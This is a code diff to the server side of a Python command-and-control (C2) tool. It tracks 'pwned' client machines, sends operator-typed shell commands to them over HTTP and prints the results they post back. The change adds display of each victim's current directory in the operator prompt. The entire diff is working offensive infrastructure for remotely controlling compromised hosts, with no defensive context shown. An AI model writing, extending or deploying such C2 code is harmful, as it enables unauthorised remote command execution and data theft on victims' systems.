@@ -4,7 +4,7 @@ C2 Server side code
 """
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
-from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 class C2Handler(BaseHTTPRequestHandler):
     """ This is a child class of the BaseHTTPRequestHandler class.
@@ -34,7 +34,7 @@ class C2Handler(BaseHTTPRequestHandler):
 
             # interactive session with client
             elif client == pwned_dict[active_session]:
-                cmd = input(f"{client_account}@{client_hostname}: ")
+                cmd = input(f"{client_account}@{client_hostname}:{cwd}$ ")
                 try:
                     self.http_response(HTTPStatusCode.OK.value)
                     # passing back command to client; must be utf-8 encode
@@ -71,16 +71,25 @@ class C2Handler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         if self.path == RESPONSE_PATH:
-            self.http_response(HTTPStatusCode.OK.value)
-            content_length = int(self.headers.get("Content-Length"))
-            # Gather the client's data by reading in the HTTP POST data
-            client_data = self.rfile.read(content_length)
-            # UTF-8 decode the client's data
-            client_data = client_data.decode()
-            client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
-            client_data = unquote_plus(client_data)
-            print(client_data)
+            print(self.handle_post_data())
+        elif self.path == CWD_RESPONSE:
+            # change path display into terminal to locate current dir
+            global cwd
+            cwd = self.handle_post_data()
+        else:
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server. Why ?\n")
                 
+    def handle_post_data(self):
+        self.http_response(HTTPStatusCode.OK.value)
+        content_length = int(self.headers.get("Content-Length"))
+        # Gather the client's data by reading in the HTTP POST data
+        client_data = self.rfile.read(content_length)
+        # UTF-8 decode the client's data
+        client_data = client_data.decode()
+        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
+        client_data = unquote_plus(client_data)
+        return client_data
+
     def http_response(self, code: int):
         self.send_response(code)
         self.end_headers()
@@ -91,6 +100,7 @@ class C2Handler(BaseHTTPRequestHandler):
         return 
 
 active_session = 1
+cwd = "~"
 client_account = ""
 client_hostname = ""
 pwned_id = 0
